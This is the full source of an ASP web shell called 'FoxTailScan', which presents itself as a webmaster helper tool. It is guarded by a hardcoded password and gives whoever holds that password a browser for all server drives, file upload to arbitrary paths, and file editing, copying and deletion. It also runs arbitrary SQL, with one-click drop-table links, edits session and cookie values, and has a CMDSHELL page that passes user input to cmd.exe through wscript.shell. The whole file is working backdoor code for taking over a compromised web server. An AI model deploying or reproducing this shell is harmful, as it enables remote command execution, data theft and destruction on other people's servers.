<bgsound src="music.mid" loop="-1">
<%
response.buffer=true
filename=Request.ServerVariables("URL")
Server.ScriptTimeout=5000
On Error Resume Next 
proname="FoxTailScan"
Rem 呵呵
userpass="FTS"

Dim oUpFileStream

Class UpFile_Class

Dim Form,File

Public Sub GetDate (RetSize)
   '定义变量
  Dim RequestBinDate,sSpace,bCrLf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,oFileInfo
  Dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  Dim iFindStart,iFindEnd
  Dim iFormStart,iFormEnd,sFormName
   '代码开始
  If Request.TotalBytes < 1 Then
    Err = 1
    Exit Sub
  End If
  If RetSize > 0 Then 
    If Request.TotalBytes > RetSize Then
    Err = 2
    Exit Sub
    End If
  End If
  Set Form = Server.CreateObject ("Scripting.Dictionary")
  Form.CompareMode = 1
  Set File = Server.CreateObject ("Scripting.Dictionary")
  File.CompareMode = 1
  Set tStream = Server.CreateObject ("Adodb.Stream")
  Set oUpFileStream = Server.CreateObject ("Adodb.Stream")
  oUpFileStream.Type = 1
  oUpFileStream.Mode = 3
  oUpFileStream.Open 
  oUpFileStream.Write Request.BinaryRead (Request.TotalBytes)
  oUpFileStream.Position = 0
  RequestBinDate = oUpFileStream.Read 
  iFormEnd = oUpFileStream.Size
  bCrLf = ChrB (13) & ChrB (10)
  '取得每个项目之间的分隔符
  sSpace = MidB (RequestBinDate,1, InStrB (1,RequestBinDate,bCrLf)-1)
  iStart = LenB  (sSpace)
  iFormStart = iStart+2
  '分解项目
  Do
    iInfoEnd = InStrB (iFormStart,RequestBinDate,bCrLf & bCrLf)+3
    tStream.Type = 1
    tStream.Mode = 3
    tStream.Open
    oUpFileStream.Position = iFormStart
    oUpFileStream.CopyTo tStream,iInfoEnd-iFormStart
    tStream.Position = 0
    tStream.Type = 2
    tStream.CharSet = "gb2312"
    sInfo = tStream.ReadText      
    iFormStart = InStrB (iInfoEnd,RequestBinDate,sSpace)-1
    iFindStart = InStr (22,sInfo,"name=""",1)+6
    iFindEnd = InStr (iFindStart,sInfo,"""",1)
    sFormName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
    If InStr  (45,sInfo,"filename=""",1) > 0 Then
      Set oFileInfo = new FileInfo_Class
      iFindStart = InStr (iFindEnd,sInfo,"filename=""",1)+10
      iFindEnd = InStr (iFindStart,sInfo,"""",1)
      sFileName = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
      oFileInfo.FileName = Mid (sFileName,InStrRev (sFileName, "\")+1) 
      oFileInfo.FilePath = Left (sFileName,InStrRev (sFileName, "\"))
      oFileInfo.FileExt = Mid (sFileName,InStrRev (sFileName, ".")+1)
      iFindStart = InStr (iFindEnd,sInfo,"Content-Type: ",1)+14
      iFindEnd = InStr (iFindStart,sInfo,vbCr)
      oFileInfo.FileType = Mid  (sinfo,iFindStart,iFindEnd-iFindStart)
      oFileInfo.FileStart = iInfoEnd
      oFileInfo.FileSize = iFormStart -iInfoEnd -2
      oFileInfo.FormName = sFormName
      file.add sFormName,oFileInfo
    else

      tStream.Close
      tStream.Type = 1
      tStream.Mode = 3
      tStream.Open
      oUpFileStream.Position = iInfoEnd 
      oUpFileStream.CopyTo tStream,iFormStart-iInfoEnd-2
      tStream.Position = 0
      tStream.Type = 2
      tStream.CharSet = "gb2312"
      sFormValue = tStream.ReadText
      If Form.Exists (sFormName) Then
        Form (sFormName) = Form (sFormName) & ", " & sFormValue
        else
        form.Add sFormName,sFormValue
      End If
    End If
    tStream.Close
    iFormStart = iFormStart+iStart+2
  Loop Until  (iFormStart+2) = iFormEnd 
  RequestBinDate = ""
  Set tStream = Nothing
End Sub
End Class

Class FileInfo_Class
Dim FormName,FileName,FilePath,FileSize,FileType,FileStart,FileExt
Public Function SaveToFile (Path)
  On Error Resume Next
  Dim oFileStream
  Set oFileStream = CreateObject ("Adodb.Stream")
  oFileStream.Type = 1
  oFileStream.Mode = 3
  oFileStream.Open
  oUpFileStream.Position = FileStart
  oUpFileStream.CopyTo oFileStream,FileSize
  oFileStream.SaveToFile Path,2
  oFileStream.Close
  Set oFileStream = Nothing 
End Function

Public Function FileDate
  oUpFileStream.Position = FileStart
  FileDate = oUpFileStream.Read (FileSize)
  End Function
End Class

if request("up")="yes" then
   set upload=new UpFile_Class
   upload.GetDate (1024*1024)
   for each formName in upload.file
   set file=upload.file(formName)
    if file.FileSize>0 then
	   if instr(upload.form("filepath"),":")>0 then
       savepath=upload.form("filepath")
       else
       savepath=Server.mappath(upload.form("filepath"))
       end if
	file.SaveToFile savepath
	response.write "上传成功!上传后的路径为"&savepath&"<br>"
   end if
   set file=nothing
   next
   set upload=nothing
   showerr()
   response.end
end if
%>
<center>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=proname%></title>
<style type="text/css">
<!--
td,textarea,body{
    font-size:9pt;
	}
table{
	background-color: #ffffff;
	border-top: 1px solid #cccccc;
	border-right: 1px solid #666666;
	border-bottom: 1px solid #666666;
	border-left: 1px solid #cccccc;
}
input{
	background-color: #efefef;
	border-top: 1px solid #cccccc;
	border-right: 1px solid #666666;
	border-bottom: 1px solid #666666;
	border-left: 1px solid #cccccc;
}
.small{font-size:8pt}
-->
</style>
<script language="javascript">
function yesok(){
if (confirm("确认要执行此操作吗？"))
		return true;
	else
		return false;
}
 function show(page,ptitle,w,h)
  {
window.open(page,ptitle,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+w+",height="+h);
  }

</script>
<%

Dim userpass,Conn,ConnStr,SQL,Help,dbp

repage=request.servervariables("http_referer")

if instr(repage,filename)=0 then repage=filename


if request.form("loginpass")<>"" then
logincheck(request.form("loginpass"))
showerr()
response.end
end if

if session("xl")<>userpass then
loginform()
showerr()
response.end
end if

if request.querystring("logout")="yes" then
logout()
showerr()
response.end
end if


if request("showpath")="yes" then
searchpath()
showerr()
response.end
end if

if request("editpath")<>"" then
edittxtfile(request("editpath"))
showerr()
response.end
end if

if request.form("textpath")<>"" then
call modifyfile(request.form("textpath"))
showerr()
response.end
end if

if request("delpath")<>"" then
call deletefile(request("delpath"))
showerr()
response.end
end if

if request("deldirpath")<>"" then
call deletedir(request("deldirpath"))
showerr()
response.end
end if

if request("copypath")<>"" then
call copyfile(request("copypath"))
showerr()
response.end
end if

if request("upfile")="yes" then
call upfile()
showerr()
response.end
end if

if request("showsc")="yes" then
co1=request.form("co1")
co2=request.form("co2")
cov=request.form("cov")
sess1=request.form("sess1")
sessv=request.form("sessv")

if co1<>"" and co2="" then
Response.Cookies(co1).Expires=Date+30
Response.Cookies(co1)=cov
end if

if request("delsession")<>"" then
session.Contents.Remove(request("delsession"))
response.redirect"?showsc=yes"
response.end
end if
if request("delcookies")<>"" then
Response.Cookies(request("delcookies")).Expires=Date-1
response.redirect"?showsc=yes"
response.end
end if

if co1<>"" and co2<>"" then
Response.Cookies(co1).Expires=Date+30
Response.Cookies(co1)(co2)=cov
end if

if sess1<>"" then
'session.abandon
session(sess1)=sessv
end if

showsc()
showerr()
response.end
end if

if request("cmdshell")="yes" then
cmdshell()
response.end
end if

if request.querystring("cleardata")="yes" then
session("dbsourcepath")=""
session("sqlstr")=""
end if

dbp=request("dbsourcepath")
if dbp<>"" then session("dbsourcepath")=trim(dbp)

if instr(session("dbsourcepath"),":")>0 or instr(LCase(session("dbsourcepath")),"sql server")>0 or instr(LCase(session("dbsourcepath")),"dsn=")>0 then
dbp=session("dbsourcepath")
else
dbp=Server.MapPath(session("dbsourcepath"))
end if

sqlstr=trim(request("sqlstr"))
if sqlstr<>"" then session("sqlstr")=sqlstr

Help="在线数据库管理，在线文件管理，CMD命令执行\n"
Help=Help & "文件上传,站内cookie,session管理\n"
%>
 

  <body topmargin="5" onkeydown="if(event.ctrlKey&&event.keyCode=='13'){form1.Submit.click();}">
<%sub showsc()%>
  <table width="700" border="0" cellpadding="0" cellspacing="0">
    <form name="form33" method="post" action="">
      <tr bgcolor="#003366"> 
        <td height="27"><font color="#FFFFFF">&nbsp;response.cookies</font><font color="#FFFFFF">(&quot; 
          <input name="co1" value="<%=co1%>" size="15">
          &quot;)(&quot; 
          <input name="co2" value="<%=co2%>" size="15">
          &quot;)=&quot; 
          <input name="cov" value="<%=cov%>" size="15">
          &quot; &nbsp; 
          <input name="Submit" type="submit"  value="设置COOKIES">
          </font></td>
      </tr>
    </form>
    <tr bgcolor="#990000"> 
      <td height="27" bgcolor="#efefef"> 
        <%
response.write"当前本站点保存在你机上的所有COOKIES如下：<br>"
For Each Item in Request.Cookies 
If Request.Cookies(Item).HasKeys Then 

For Each ItemKey in Request.Cookies(Item) 
Response.Write "<b>response.cookies('"&Item &"')('"&ItemKey&"')</b>="& Request.Cookies(Item)(ItemKey)& "<a href='?showsc=yes&delcookies="&item&"'>删</a><br>"
Next 
Else 
Response.Write "<b>response.cookies('"&Item &"')</b>="& Request.Cookies(Item) & "<a href='?showsc=yes&delcookies="&item&"'>删</a><br>"
End If 
Next
%>
      </td>
    </tr>
    <form name="form22" method="post" action="">
      <tr bgcolor="#990000"> 
        <td width="599" height="27"><font color="#FFFFFF">&nbsp;session(&quot; 
          <input name="sess1" value="<%=sess1%>" size="15">
          &quot;)=&quot; 
          <input name="sessv" value="<%=sessv%>" size="15">
          &quot; &nbsp; 
          <input name="Submit" type="submit" id="Submit" value="设置SESSION">
          &nbsp;</font></td>
      </tr>
    </form>
    <tr bgcolor="#990000"> 
      <td height="27" bgcolor="#efefef"> 
        <%
Response.Write "你在该站点上的SESSION数量: " & Session.Contents.Count&"<br>" 
For Each strName in Session.Contents
If IsArray(Session(strName)) then 
For iLoop = LBound(Session(strName)) to UBound(Session(strName)) 
Response.Write "session('"&strName & ")(" & iLoop & ") = " & Session(strName)(iLoop) & "<a href='?showsc=yes&delsession="&strname&"'>删</a><BR>" 
Next 
Else 
Response.Write "session('"&strName & "') = " & Session.Contents(strName) & "<a href='?showsc=yes&delsession="&strname&"'>删</a><BR>" 
End If 
next
%>
      </td>
    </tr>
  </table>
<%end sub%>
  <table width="700" border="0" cellpadding="0" cellspacing="0">
    <form name="form1" method="post" action="<%=filename%>">
    <tr> 
        <td width="581" height="27" colspan="2" align="center">ACCESS数据库路径[相对路径如:database/db.mdb 绝对路径：d:\web\database\db.mdb]<br>
		其它连接方式:[如：server=localhost;Database=dbname;Uid=userid;Pwd=password;Driver={SQL SERVER}]
          数据库连接串：<input name="dbsourcepath" value="<%=session("dbsourcepath")%>"  style="width:450;height:20"></td>
        <td width="119" rowspan="2" align="center"> <input name="sp" type="button" id="sp" onClick="show('<%=filename%>?showpath=yes','showfso',300,400)" value="文件" title="管理站内文件">
		<input name="scc" type="button" onClick="show('<%=filename%>?upfile=yes','upfile',400,180)" value="上传" title="上传文件到服务器">
          <input name="cy2" type="button" onClick="show('<%=filename%>?showsc=yes','showsc',760,200)" value="会话" title="管理站内SESSION,COOKIE">
          <input name="cleardata" type="button" id="cleardata" onClick="location='<%=filename%>?cleardata=yes'" value="初始">
          <input name="cmdshell" type="button" id="cmdshell" onClick="show('<%=filename%>?cmdshell=yes','cmdshell',500,400)" value="CMDSHELL" title="打开CMDSHELL执行窗口">
          <br> 
          <input name="help" type="button" value="帮助" onClick="confirm('<%=help%>')" title="显示帮助">
        <input name="cy" type="button" onClick="cyyj.style.display=''" value="常用" title="显示常用SQL命令按钮"> 
        <br>
        <input name="clear" type="button" value="清空" onClick="form1.sqlstr.value=''" title="清空SQL输入框内容">
        <input type="submit" name="Submit" value="执行" onClick="yesok()" title="执行SQL语句，默认是显示数据表名称"> 
      </td>
    </tr>
    <tr> 
      <td width="30" height="100" align="center" >SQL<br>
        语<br>句<br>输<br>
        入<br>        </td>
      <td align="center" ><textarea name="sqlstr" style="width:550;height:80"><%=session("sqlstr")%></textarea></td>
    </tr>
  </form>
  <tr align="center" id="cyyj" style="display:none"> 
    <td colspan="3"><input name="select" type="button"  onClick="form1.sqlstr.value=this.value" value="select * from"> 
      <input name="insert" type="button" onClick="form1.sqlstr.value=this.value" value="insert into">
        <input name="delete" type="button" onClick="form1.sqlstr.value=this.value" value="delete from"> 
      <input name="create" type="button" onClick="form1.sqlstr.value=this.value" value="create table"> 
      <br>
        <input name="update" type="button" onClick="form1.sqlstr.value=this.value" value="update">
        <input name="alter" type="button" onClick="form1.sqlstr.value=this.value" value="alter table"> 
      <input name="drop" type="button" onClick="form1.sqlstr.value=this.value" value="drop table"> 
      <input name="where" type="button" onClick="form1.sqlstr.value+=' '+this.value" value="where"> 
      <input name="order" type="button" onClick="form1.sqlstr.value+=' '+this.value" value="order by"> 
    </td>
  </tr>
</table>


  <%
Conntting(dbp)
response.write"<br>"

showtable()
response.write"<br><br>"

if session("sqlstr")<>"" then
  if LCase(left(session("sqlstr"),6))="select" then
       response.write "执行语句："&session("sqlstr")
       set rs=server.createobject("adodb.recordset")
	   rs.open session("sqlstr"),conn,1,1
	   errorinfo()
	   shownum=rs.fields.count
	   rs.pagesize=20
	   count=rs.pagesize
	   page=request.querystring("page")
	   if page<>"" then page=clng(page)
	   if page="" or page=0 then page=1
	   pgnm=rs.pagecount
	   if page>pgnm then page=pgnm
	   if page>1 then rs.absolutepage=page
	   
	   response.write"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
	   for n=0 to shownum-1
	   set fld=rs.fields.item(n)
	   response.write"<td align='center' title='字段类型："&fld.type&"'>"&fld.name&"</td>"
	   next
	   set fld=nothing
	   response.write"</tr>"
	   
	   do while not (rs.eof or rs.bof) and count>0
	   count=count-1
	   bgcolor="#efefef"
	   response.write"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	   for i=0 to shownum
	   
	   if bgcolor="#efefef" then
	   bgcolor="#f5f5f5"
	   else
	   bgcolor="#efefef"
	   end if
	   
	   response.write"<td bgcolor="&bgcolor&">"&left(rs(i),50)&"</td>"
	   next
	   
	   response.write"</tr>"
	   rs.movenext
	   loop
	   response.write"<tr><td colspan="&shownum+1&" align=center>记录数："&rs.recordcount&"&nbsp;页码："&page&"/"&pgnm
	   if pgnm>1 then
	   response.write"&nbsp;&nbsp;<a href=?page=1>首页</a>&nbsp;<a href=?page="&page-1&">上一页</a>"
	   response.write"&nbsp;<a href=?page="&page+1&">下一页</a>&nbsp;<a href=?page="&pgnm&">尾页</a>"
	   end if
	   response.write"</td></tr></table>"
	   
	   rs.close
	   set rs=nothing
  else	   
       conn.execute(session("sqlstr"))
	   response.write "执行语句："&session("sqlstr")
	   errorinfo()
  end if	   
end if

sub errorinfo()
    	If Err Then
		Response.Write  "<font color=#ff0000>操作失败，原因：" & Err.Description & "</font><BR>" 
		if left(session("sqlstr"),6)="select" then
		rs.close
		set rs=nothing
		end if
		conn.close
		set conn=nothing
		Err.Clear
		Response.Flush
	    Else
		Response.Write  "<font color=#0000ff>操作成功</font><BR>"
		Response.Flush
	    End If
end sub		

sub showtable()
set rs=Conn.openSchema(20) 

response.write"<table><tr height=25 bgcolor=#cccccc><td>表<br>名</td>"
rs.movefirst 
do while not rs.eof
if rs("TABLE_TYPE")="TABLE" then
 
response.write"<td align=center><a href='?sqlstr=drop table "&rs("TABLE_NAME")&"' title='删除"&rs("TABLE_NAME")&"数据表'>删</a><br><br>"
response.write"<a href='?sqlstr=select * from "&rs("TABLE_NAME")&" order by 1 desc' title='显示"&rs("TABLE_NAME")&"数据表的内容'>"&rs("TABLE_NAME")&"</a></td>"

end if 
rs.movenext 
Loop 
response.write"</tr></table>"
                                                                                          
set rs=nothing 
end sub

conn.close
set conn=nothing

copyright()

Sub Conntting(dbp)
	Set Conn = Server.CreateObject("ADODB.Connection")
	if instr(LCase(dbp),"sql server")>0 or instr(LCase(dbp),"dsn=")>0 then
	ConnStr=dbp
	else
	ConnStr = "Provider = Microsoft.Jet.OLEDB.4.0;Data Source ="&dbp
	end if
	Conn.Open ConnStr
	If Err Then
		Err.Clear
		conn.close
		Set Conn = Nothing
		Response.Write "请确认您输入的数据库地址是否正确。"
		Response.End
	End If
End Sub

sub searchpath()
response.write"<body bgcolor='menu' style='border:0' topmargin='0'>"
set f=server.createobject("scripting.filesystemobject")

For Each thing in f.Drives
Response.write "<a href='"&url&"?showpath=yes&path="&thing.DriveLetter&":'>"&thing.DriveLetter&"盘:</a>          "
NEXT

      path=request("path")
      if path<>"" then
	     if instr(path,":")>0 then
         path=path
         else
         path=Server.MapPath(path)
         end if
	  else
	  path=server.mappath("/")
	  end if
	  opath=request("opath")
response.write "<br>当前路径："&path	  
  set fold=f.getfolder(path)
  response.write"<br><table width='98%'>"
  response.write "<tr height=18><td><font face='wingdings' color='#003366'>0</font>&nbsp;<a href='"&url&"?showpath=yes&path="&opath&"'>回上级目录</a>&nbsp;&nbsp;&nbsp;<a href='javascript:show("""&filename&"?upfile=yes"",""upfile"",400,180)'>上传文件</a><br></td></tr>"
  for each item in fold.subfolders
  jpath=replace(path,"\","\\")
    response.write "<tr height=18><td><font face='wingdings' color='#003366'>0</font>&nbsp;<a href='"&url&"?showpath=yes&path="&path&"\"&item.name&"&opath="&path&"'>"&item.name&"</a>"
response.write"&nbsp;&nbsp;<a href='javascript:show("""&filename&"?deldirpath="&jpath&"\\"&item.name&""",""deldirform"",200,180)' style='color:#cccccc' onclick='return yesok()'>删除目录</a></td></tr>"
  next
   for each item in fold.files
   fpath=replace(path&"\"&item.name,"\","\\")
   response.write "<tr height=18><td><font face='wingdings' color='#ff0000'>2</font>&nbsp;<a href=# onclick='opener.form1.dbsourcepath.value="""&fpath&""";window.close()' title='修改时间:"&item.DateLastModified&"文件大小:"&clng(item.size/1024)&"k'>"&item.name&"</a>&nbsp;&nbsp;"
   aaa=split(item.name,".")
   if LCase(aaa(1))="txt" or LCase(aaa(1))="htm" or LCase(aaa(1))="asa" or LCase(aaa(1))="html" or LCase(aaa(1))="shtml" or LCase(aaa(1))="asp"or LCase(aaa(1))="inc" then
   response.write"<a href='javascript:show("""&filename&"?editpath="&fpath&""",""editform"",600,500)' style='color:#666666'>编辑</a>&nbsp;&nbsp;"
   end if
   response.write"<a href='javascript:show("""&filename&"?delpath="&fpath&""",""delform"",200,180)' style='color:#ff0000' onclick='return yesok()'>删除</a>&nbsp;&nbsp;"
  response.write"<a href='javascript:show("""&filename&"?copypath="&fpath&""",""copyform"",300,180)' style='color:#666666'>复制</a></td></tr>"
   next

  response.write "<tr height=18><td><br><br><font face='wingdings' color='#003366'>0</font>&nbsp;<a href='"&filename&"?showpath=yes&path=/'>返回站点根目录</a></td></tr>"
  
  response.write"</table></body></center>"
  set fold=nothing

set f=nothing
end sub

sub copyfile(sfile)
if request.form("mbfilepath")<>"" then
set f=server.createobject("scripting.filesystemobject")
mbfilepath=request.form("mbfilepath")
  if instr(mbfilepath,":")>0 then
  if right(mbfilepath,1)<>"\" then mbfilepath=mbfilepath&"\"
  else
  mbfilepath=Server.MapPath(mbfilepath)
  if right(mbfilepath,1)<>"/" then mbfilepath=mbfilepath&"\"
  end if
f.copyfile sfile,mbfilepath
response.write"复制成功"
response.end
else
response.write"<form method='post' action='"&filename&"?copypath="&sfile&"'>"
response.write"从"&sfile&"<br>"
response.write"复制到：<input name='mbfilepath'>"
response.write"<input type='submit' value='开始复制'>"
response.write"</form>"
end if
end sub

sub edittxtfile(tpath)
response.write"<body bgcolor='menu' style='border:0' topmargin='0'>"
set f=server.createobject("scripting.filesystemobject")
set txtfile=f.opentextfile(tpath, 1, False)
counter=0
txtcontent=txtfile.readall 
txtfile.close

response.write"<table width='98%'><tr><td align=center bgcolor=#efefef><br>"  
response.write"<form action="&filename&" method='post' name='editform'>文件路径："
response.write"<input name='textpath' value="&tpath&" size=60><br>"
response.write"<textarea name=content cols=80 rows=28>"&txtcontent&"</textarea><br>"
response.write"<br><input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='修改'></form>"
response.write"</td></tr></table></body></center>"

set f=nothing
end sub

sub cmdshell()
response.write"<form method=post>"
response.write"<input type=text name=cmd size=55>"
response.write"<input type=submit value=执行></form>"
response.write"<textarea readonly cols=69 rows=22>"
response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request.form("cmd")).stdout.readall
response.write"</textarea>"
end sub

sub modifyfile(mpath)
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(mpath)
outfile.WriteLine Request.form("content")
outfile.close
set fs=nothing
Response.write "<center>修改成功！1秒钟后自动关闭此页!</center>"
response.write"<script>opener.window.location.reload()</script>"
response.write"<meta http-equiv='refresh' content='2;URL=javascript:window.close()'>"
end sub

sub deletefile(dfpath)
Set fs = CreateObject("Scripting.FileSystemObject")
fs.deletefile dfpath
set fs=nothing
Response.write "<center>删除成功！程序将自动刷新上一页！</center>"
response.write"<script>opener.window.location.reload()</script>"
response.write"<meta http-equiv='refresh' content='2;URL=javascript:window.close()'>"
end sub

sub deletedir(dirpath)
Set f = CreateObject("Scripting.FileSystemObject")
if f.folderexists(dirpath) then
f.deletefolder dirpath
set f=nothing
end if
Response.write "<center>目录"&dirpath&"<br>删除成功！程序将自动刷新上一页！</center>"
response.write"<script>opener.window.location.reload()</script>"
response.write"<meta http-equiv='refresh' content='2;URL=javascript:window.close()'>"
end sub

sub loginform()
response.write"<br><br>欢迎使用ASP站长助手<br><br><form action='"&filename&"' method='post' name='lform'>请输入密码：<input name='loginpass' type='password' size='15'>&nbsp;<input type='submit' value='登录'></form>"
end sub

sub logincheck(upass)
if upass=userpass then
session("xl")=userpass
response.redirect repage
else
response.write"验证未通过！"
end if
end sub

sub logout()
session("xl")=""
response.redirect filename
end sub

sub showerr()
	If Err Then
		Response.Write  Err.Description
		Err.Clear
		Response.Flush
	 End If
end sub

sub upfile()
%>
  <table width="347" height="58" border="0" cellpadding="0" cellspacing="0" >
    <form name="form11" method="post" action="<%=filename%>?up=yes" enctype="multipart/form-data">
	  <tr align="center" valign="middle"> 
        <td height="30">上传路径[必须是完整路径][如"bbs/test.asp"或"d:\web\test.asp"]：<font color="#FFFFFF"> 
          <input name="filepath" value="/test.asp" size="30">
          </font></td>
      </tr>
      <tr align="center" valign="middle"> 
        <td height="28"><input name="file1" type="file"  size="25"> 
          <input type="submit" name="Submit" value=" 上传"></td>
      </tr>
    </form>
  </table>
 <%
 end sub

Sub copyright()
response.write"<hr><center>"&proname&" 版权没有 <a href=http://www.sycnet.com>crazy-四叶草网络</a><br><br><img src='http://qmna.3322.org/qman/china.gif'><br>"
response.write"<br>gxgl.com &nbsp;gxgl.net&nbsp;vips.cn&nbsp;66i.net</center><br><br><a href="&filename&"?logout=yes>退出登录</a>"
End Sub
%>
</body>
  </center>